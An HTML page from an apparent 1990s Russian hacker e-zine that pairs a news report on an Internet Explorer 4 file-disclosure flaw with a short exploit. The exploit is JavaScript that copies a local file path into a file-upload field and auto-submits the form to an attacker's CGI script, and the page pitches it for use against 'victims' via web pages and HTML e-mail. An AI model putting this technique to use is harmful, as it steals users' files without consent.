<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>-== ThE NeW OrDeR #1 ==-</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080" onload="...">

<p align="center"><font color="#FF0000" size="4"><strong>Браузер
Microsoft открывает хакерам доступ к
жестким дискам пользователей <br>
</strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p><font color="#FFFFFF"><strong>Проблема в том,
что с помощью JavaScript в IE4 и выше можно
выполнить команды Copy и Paste, а также
отправить форму без ведома
пользователя. Итак, создаем форму, в ней скрытое поле <input type="hidden" name="T1" value="c:\config.sys">, поле для выбора файлов

 <br>      <input type="file" name="filename" value="c:\config.sys">, <br>после чего пишем следующий код (разумеется, вызывающийся в <body onLoad=...>): 
<br>       function getfile() 
<br>       { 
<br>         document.forms[1].T1.select(); 
    <br>     document.execCommand("copy"); 
  <br>       document.forms[0].filename.select(); 
  <br>       document.execCommand("paste"); 
 <br>        document.forms[0].submit(); 
 <br>      } 

<br>Ну а дальше за дело берется cgi-скрипт. Конечно, это сработает только если не отключено предупреждение об отправлении формы, но как показывает практика, нормальные люди делают это практически сразу.  Разумеется, это все можно использовать и в html-сообщениях, не томясь в ожидании захода жертвы на нужную страницу. 
Корпорация Microsoft признала наличие одного дефекта в системе обеспечения безопасности своего браузера Internet Explorer, используя который хакеры, знающие, что искать, могут просматривать файлы на жестких дисках посетителей своих Web-узлов. 
Операционная система Windows 98 со своей встроенной версией Internet Explorer также уязвима для основанных на использовании данной ошибки атак. По словам представителя Microsoft по связям с прессой, дефект проявляется в версиях IE 4.0 и 4.01 для Windows 3.1, Windows 95, NT 3.51 и NT 4.
Эта ошибка, на которую внимание разработчиков Microsoft было обращено полторы недели назад, не является в полном смысле "брешью в крепостной стене". Как заявила представитель компании по связям с прессой, для просмотра информации хакеру необходимо составить считывающий ее сценарий, содержащий точные имена интересующих его файлов. По ее словам, компания не получила еще ни одного сообщения от своих клиентов, в котором бы говорилось о вызванных этой ошибкой проблемах. 
Пока разработчики Microsoft трудятся над исправлением программы, компания рекомендует своим пользователям защититься от возможных неприятностей путем отключения функции active scripting для всех зон безопасности Internet Explorer. Исправленная версия ПО будет опубликована на Web-узле Microsoft в разделе Internet Explorer Security Area. 
В прошлом месяце разработчики Microsoft уже исправляли аналогичную ошибку в Explorer.
</strong></font></p>

<p align="center"><a href="../TNO#1_start.htm"><img src="../images/14ic3.gif"
border="0" width="60" height="65"></a></p>
<p align="center"><img src="../images/coollogo_com_7565375.jpg" width="206"
height="53"></p>
</body>
</html>
